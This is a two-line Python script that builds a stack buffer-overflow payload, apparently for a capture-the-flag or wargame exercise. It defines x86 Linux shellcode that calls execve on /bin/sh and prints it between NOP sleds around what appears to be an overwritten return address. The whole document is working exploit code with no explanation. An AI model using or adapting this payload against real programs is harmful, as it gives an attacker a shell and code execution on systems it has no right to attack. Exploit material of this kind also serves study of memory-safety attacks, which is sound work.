shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80"
print(132 * b"\x90" + shellcode + b"\xb0\xd4\x3f\xfc" + 10000 * b"\x90" + shellcode)
